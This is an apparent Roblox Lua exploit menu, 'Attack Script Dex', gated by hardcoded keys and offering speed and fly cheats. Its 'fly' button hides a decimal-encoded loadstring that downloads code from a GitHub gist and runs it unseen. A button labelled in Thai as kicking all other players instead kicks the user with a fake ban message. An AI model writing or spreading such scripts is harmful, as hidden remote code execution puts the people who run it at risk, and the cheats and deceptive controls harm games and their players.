


local RunerScript = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local TextBox = Instance.new("TextBox")
local UICorner_3 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
local UIAspectRatioConstraint_5 = Instance.new("UIAspectRatioConstraint")
local BG1 = Instance.new("ImageButton")
local UIAspectRatioConstraint_6 = Instance.new("UIAspectRatioConstraint")
local UICorner_5 = Instance.new("UICorner")
local BG2 = Instance.new("ScrollingFrame")
local TextButton_2 = Instance.new("TextButton")
local UIAspectRatioConstraint_7 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
local TextButton_3 = Instance.new("TextButton")
local UIAspectRatioConstraint_8 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
local UIAspectRatioConstraint_9 = Instance.new("UIAspectRatioConstraint")
local TextButton_4 = Instance.new("TextButton")
local UIAspectRatioConstraint_10 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
local TextBox_2 = Instance.new("TextBox")
local UICorner_6 = Instance.new("UICorner")
local UIAspectRatioConstraint_11 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
local toggle = Instance.new("TextButton")
local UIAspectRatioConstraint_12 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_8 = Instance.new("UITextSizeConstraint")

--Properties:

RunerScript.Name = "RunerScript!"
RunerScript.Parent = game.CoreGui
RunerScript.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = RunerScript
Frame.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.322817326, 0, 0.325609744, 0)
Frame.Size = UDim2.new(0.354365379, 0, 0.476829261, 0)

UICorner.Parent = Frame

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
Frame_2.BorderColor3 = Color3.fromRGB(84, 84, 84)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.00811754912, 0, 0.0161468424, 0)
Frame_2.Size = UDim2.new(0.981366456, 0, 0.299232751, 0)

UICorner_2.Parent = Frame_2

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0274261609, 0, 0.0769230798, 0)
TextLabel.Size = UDim2.new(0.932489455, 0, 0.820512831, 0)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "Attack Script Dex"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

UIAspectRatioConstraint.Parent = TextLabel
UIAspectRatioConstraint.AspectRatio = 4.604

UITextSizeConstraint.Parent = TextLabel
UITextSizeConstraint.MaxTextSize = 63

UIAspectRatioConstraint_2.Parent = Frame_2
UIAspectRatioConstraint_2.AspectRatio = 4.051

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(132, 132, 132)
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0269151144, 0, 0.833759606, 0)
TextBox.Size = UDim2.new(0.927536249, 0, 0.127877235, 0)
TextBox.Font = Enum.Font.SourceSansBold
TextBox.PlaceholderText = "Key Here"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left

UICorner_3.Parent = TextBox

TextButton.Parent = TextBox
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0424107127, 0, 1.29999995, 0)
TextButton.Size = UDim2.new(0.912946403, 0, 0.439999968, 0)
TextButton.Font = Enum.Font.SourceSansBold
TextButton.Text = "- Enter -"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

UICorner_4.CornerRadius = UDim.new(0, 80)
UICorner_4.Parent = TextButton

UIAspectRatioConstraint_3.Parent = TextButton
UIAspectRatioConstraint_3.AspectRatio = 18.591

UITextSizeConstraint_2.Parent = TextButton
UITextSizeConstraint_2.MaxTextSize = 14

UIAspectRatioConstraint_4.Parent = TextBox
UIAspectRatioConstraint_4.AspectRatio = 8.960

UITextSizeConstraint_3.Parent = TextBox
UITextSizeConstraint_3.MaxTextSize = 50

UIAspectRatioConstraint_5.Parent = Frame
UIAspectRatioConstraint_5.AspectRatio = 1.235

BG1.Name = "BG1"
BG1.Parent = Frame
BG1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BG1.BorderColor3 = Color3.fromRGB(0, 0, 0)
BG1.BorderSizePixel = 0
BG1.Position = UDim2.new(0.0269151144, 0, 0.332480818, 0)
BG1.Size = UDim2.new(0.921325028, 0, 0.465473145, 0)
BG1.Image = "rbxassetid://9468220156"

UIAspectRatioConstraint_6.Parent = BG1
UIAspectRatioConstraint_6.AspectRatio = 2.445

UICorner_5.Parent = BG1

BG2.Name = "BG2"
BG2.Parent = Frame
BG2.Active = true
BG2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BG2.BackgroundTransparency = 1.000
BG2.BorderColor3 = Color3.fromRGB(0, 0, 0)
BG2.BorderSizePixel = 0
BG2.Position = UDim2.new(0.0331262946, 0, 0.345268548, 0)
BG2.Size = UDim2.new(0.915113866, 0, 0.590792835, 0)
BG2.Visible = false

TextButton_2.Parent = BG2
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BackgroundTransparency = 1.000
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.0384615399, 0, 0.0184624735, 0)
TextButton_2.Size = UDim2.new(0, 409, 0, 50)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "เตะผู้เล่นคนอื่นในเซิฟออกจนหมด"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

UIAspectRatioConstraint_7.Parent = TextButton_2
UIAspectRatioConstraint_7.AspectRatio = 8.180

UITextSizeConstraint_4.Parent = TextButton_2
UITextSizeConstraint_4.MaxTextSize = 42

TextButton_3.Parent = BG2
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BackgroundTransparency = 1.000
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.0384615399, 0, 0.114448711, 0)
TextButton_3.Size = UDim2.new(0, 409, 0, 50)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "โปรลอยได้"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

UIAspectRatioConstraint_8.Parent = TextButton_3
UIAspectRatioConstraint_8.AspectRatio = 8.180

UITextSizeConstraint_5.Parent = TextButton_3
UITextSizeConstraint_5.MaxTextSize = 42

UIAspectRatioConstraint_9.Parent = BG2
UIAspectRatioConstraint_9.AspectRatio = 1.913

TextButton_4.Parent = BG2
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BackgroundTransparency = 1.000
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.0384615399, 0, 0.20197022, 0)
TextButton_4.Size = UDim2.new(0, 409, 0, 50)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "วิงไว"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true

UIAspectRatioConstraint_10.Parent = TextButton_4
UIAspectRatioConstraint_10.AspectRatio = 8.180

UITextSizeConstraint_6.Parent = TextButton_4
UITextSizeConstraint_6.MaxTextSize = 42

TextBox_2.Parent = BG2
TextBox_2.BackgroundColor3 = Color3.fromRGB(176, 176, 176)
TextBox_2.BackgroundTransparency = 0.900
TextBox_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox_2.BorderSizePixel = 0
TextBox_2.Position = UDim2.new(0.0475113131, 0, 0.279046655, 0)
TextBox_2.Size = UDim2.new(0, 401, 0, 50)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.PlaceholderText = "Value Speed"
TextBox_2.Text = ""
TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.TextScaled = true
TextBox_2.TextSize = 14.000
TextBox_2.TextWrapped = true

UICorner_6.Parent = TextBox_2

UIAspectRatioConstraint_11.Parent = TextBox_2
UIAspectRatioConstraint_11.AspectRatio = 8.020

UITextSizeConstraint_7.Parent = TextBox_2
UITextSizeConstraint_7.MaxTextSize = 14

toggle.Name = "toggle"
toggle.Parent = RunerScript
toggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toggle.BackgroundTransparency = 1.000
toggle.BorderColor3 = Color3.fromRGB(0, 0, 0)
toggle.BorderSizePixel = 0
toggle.Position = UDim2.new(0.423330873, 0, -0.0451219529, 0)
toggle.Size = UDim2.new(0.146735147, 0, 0.0634146333, 0)
toggle.Font = Enum.Font.Unknown
toggle.Text = "Toggle"
toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
toggle.TextScaled = true
toggle.TextSize = 14.000
toggle.TextWrapped = true

UIAspectRatioConstraint_12.Parent = toggle
UIAspectRatioConstraint_12.AspectRatio = 3.846

UITextSizeConstraint_8.Parent = toggle
UITextSizeConstraint_8.MaxTextSize = 52

-- Scripts:

local function RNQSU_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local key = {
		test1 = "broCsJVFggWrHyPByRnX",
		test2 = "OTf903GZmrZGpHKLOGN2",
		test3 = "adminKeyEiei"
	}
	
	local texbox = script.Parent.Parent.Parent.TextBox
	
	script.Parent.MouseButton1Click:Connect(function()
		if texbox.Text == key.test1 or texbox.Text == key.test2 or texbox.Text == key.test3 then
			print("success")
			script.Parent.Parent.Parent.BG1.Visible = false
			texbox.Visible = false
			script.Parent.Parent.Parent.BG2.Visible = true
		else
			print("errorXD")
		end
	end)
	
end
coroutine.wrap(RNQSU_fake_script)()
local function AAWLOR_fake_script() -- BG1.LocalScript 
	local script = Instance.new('LocalScript', BG1)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent["Dog Laughing meme"]:Play()
	end)
end
coroutine.wrap(AAWLOR_fake_script)()
local function XYOKK_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
                game.Players.LocalPlayer:Kick("You has banned 109394 Days")
	end)
end
coroutine.wrap(XYOKK_fake_script)()
local function YSXG_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
	end)
end
coroutine.wrap(YSXG_fake_script)()
local function LUQDRLR_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		local texbox = script.Parent.Parent.TextBox
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = texbox.Text
		
	end)
end
coroutine.wrap(LUQDRLR_fake_script)()
local function BNZYRC_fake_script() -- toggle.LocalScript 
	local script = Instance.new('LocalScript', toggle)

	script.Parent.MouseButton1Click:Connect(function()
		local fame = script.Parent.Parent.Frame
		if fame.Visible == true then
			fame.Visible = false
		elseif fame.Visible == false then
			fame.Visible = true
		end
	end)
end
coroutine.wrap(BNZYRC_fake_script)()
